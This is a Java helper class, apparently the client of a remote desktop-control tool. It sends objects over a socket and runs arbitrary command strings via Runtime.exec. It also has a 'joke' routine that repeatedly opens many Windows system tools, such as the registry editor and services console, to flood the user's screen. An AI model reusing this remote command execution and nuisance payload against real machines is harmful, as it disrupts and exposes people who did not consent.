package com.controldesktop;

import javax.swing.*;
import java.io.*;
import java.net.Socket;

public class ClientFunction {
    public static void sendHeadMessage(Socket socket,HeadMessage hm){
        try {
            OutputStream os = socket.getOutputStream();
            BufferedOutputStream bos = new BufferedOutputStream(os);
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(hm);
            oos.flush();
        }catch (Exception e){
            JOptionPane.showMessageDialog(null,e.toString());
        }
    }

    public static String executeCommand(String cmd){
        Runtime runtime = Runtime.getRuntime();
        try{
            BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(cmd).getInputStream(),"GB2312"));
            String line;
            StringBuilder builder = new StringBuilder();
            while ((line = br.readLine()) != null){
                builder.append(line).append("\n");
            }
            return builder.toString();
        }catch (Exception e){
            return e.toString();
        }
    }


    public static void showDialog(String message){
        class showDia extends Thread{
            String message;
            public showDia(String message){
                this.message = message;
            }
            @Override
            public void run() {
                JOptionPane.showMessageDialog(null,message);
            }
        }
        new showDia(message).start();
    }

    public static String escapeSymbol(String value){
        value = value.replaceAll("\\\\","\\\\\\\\");
        value = value.replaceAll("\"","\\\\\"");
        value = value.replaceAll("'", "\\\\'");
        value = value.replaceAll("%","\\%");
        value = value.replaceAll("_","\\_");
        value = value.replaceAll("\n","\\\\\\n");
        return value;
    }

    public static void jokeToClient(int Number){
        class joke extends Thread{
            String cmd;
            public joke(String cmd){
                this.cmd = cmd;
            }
            @Override
            public void run() {
                executeCommand(cmd);
            }
        }
        for (int i = 0 ; i < Number ; i++){
            new joke("explorer").start();//资源管理器
            new joke("calc").start();//计算器
            new joke("devmgmt.msc").start();//设备管理器
            new joke("gpedit").start();//策略组
            new joke("mspaint").start();//画图板
            new joke("osk").start();//屏幕键盘
            new joke("regedit.exe").start();//注册表
            new joke("winver").start();//系统版本
            new joke("write").start();//写字板
            new joke("eudcedit").start();//造字程序
            new joke("compmgmt.msc").start();//计算机管理
            new joke("charmap").start();//字符映射表
            new joke("control").start();//控制面板
            new joke("mstsc").start();//远程桌面连接
            new joke("services.msc").start();//系统服务
            new joke("mspaint").start();//画图程序
        }
    }
    public static String[] getSystemInfo(){
        String osName = System.getProperty("os.name");//获取系统类型
        return new String[0];
    }
}
